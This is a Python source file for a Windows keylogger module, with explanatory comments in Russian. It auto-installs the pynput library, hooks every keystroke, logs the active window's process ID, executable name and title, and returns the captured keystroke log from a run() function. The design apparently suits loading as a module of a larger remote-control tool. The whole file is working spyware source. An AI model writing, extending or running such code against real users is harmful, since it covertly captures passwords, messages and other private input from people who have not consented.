def ensure_installed(package):
    try:
       keyboard =  __import__(package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", package])
        keyboard = __import__(package)
    return keyboard

from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO
import sys
import time
import subprocess

pynput = ensure_installed('pynput')


savelist = []
TIMEOUT = 10
pressed = set()




class Keylogger:
    def __init__(self):
        
        self.current_window = None
        self.running = False
        self.listener = None
        self.windowName = None
        self.counter = 0

    def get_active_process_info(self):
        hwnd = windll.user32.GetForegroundWindow() # получаем айди активного окна
        pid = c_ulong(0) # ulong как в C# только храним тут целочисленные
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid)) # тут мы передаем айди окна и передаем указатель куда будем сохранять результат. тут мы получаем айди процесса которое создало окно
        process_id = f'{pid.value}' # сохраняем айди процесса
        
        executable = create_string_buffer(512) # создаем буффер размером 512 байт для хранения пути к исполняемому файлу, такой буфер хранит массивы байтов
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid) # при помощи Windows API открываем процесс по его айди (pid) и получаем его дескриптор, затем запрашиваем права доступа 0x400 позволяет получать
        # инфу о процессе, 0х10 позволяет читать память процесса, False означает что процесс не будет наследоваться
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512) # получаем название исполняемого файла по дескриптору процесса (h_process), None указывает что нам нужно именно имя исполняемого файла а не например dll,
        # затем передаем указатель на буфер byref(executable) где мы сохраняем название исполняемого файла а 512 указывает что это максимальная для записи в буфер длина что бы память не утекла
        window_title = create_string_buffer(512) # создаем еще один буфер
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512) # тут мы извлекаем заголовок онка по его айди(дескриптору hwnd), суффикс A перед функцией указываем что мы сохраняем результат в виде ANSI кодировки
        # ANSI кодировка это как ASCII но кроме латиницы, цифр и знаков препинаний сохраняет кирилицу и еще некоторые спец символы, затем передаем указатель на буфер byref(window_title) где будет храниться заголовок и указываем максимальный размер записи что бы не было утечек памяти
        try:
            self.current_window = window_title.value.decode() # берем буфер, извлекаем и декодируем заголовок извлеченный из него и сохраняем в переменную атрибут current_window
        except UnicodeDecodeError as e: # если декодировать не получилось по разным причинам то говорим что открыто неизвестное окно
            try:
                self.current_window = window_title.value.decode('cp1251')
            except:
                print(f'{e}: window name unknown')
        windll.kernel32.CloseHandle(hwnd) # закрываем дескрипторы (айди) окна и процесса после завершения работы с ними что бы не нагружали компьютер
        windll.kernel32.CloseHandle(h_process)
        return process_id, executable.value.decode() # выводим айди процесса, название исполняемого файла и заголовок активного окна



    def keystroke_interception(self, key):
        
        pressed.add(key)
        pid, exect = self.get_active_process_info()
       
        self.counter += 1
        if self.counter == 1 or self.current_window != self.windowName:
            self.windowName = self.current_window
            print('\n', pid, exect, self.windowName)
        
        try:   
            sys.stdout.write(f'нажата клавиша [{key.char}]\n')
        except:
            sys.stdout.write(f'нажата спец. клавиша [{key}]\n')
            
        sys.stdout.flush()
        
            

    def on_release(self, key):
            try:
                pressed.remove(key)
            except KeyError:
                pass

def run():
    print('[*] in keylogger module')
    original_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = Keylogger()
    listener = pynput.keyboard.Listener(on_press=kl.keystroke_interception, on_release=kl.on_release)
    listener.start()
    kl.listener = listener
    kl.running = True
    START = time.monotonic()
    
    try:
        while True:
            if kl.running == True:
                time.sleep(1)
                if time.monotonic() - START >= TIMEOUT:
                    print("окончание программы по таймауту")
                    kl.running = False
                    kl.listener.stop()
            else:
                
                break
    except KeyboardInterrupt:
        print("\nОстановка кейлоггера...")
    log_data = sys.stdout.getvalue()
    sys.stdout = original_stdout
    return log_data


    
        

if __name__ == '__main__':
    result = run()
    print(result)
    print('\ndone.')
    sys.exit(0)
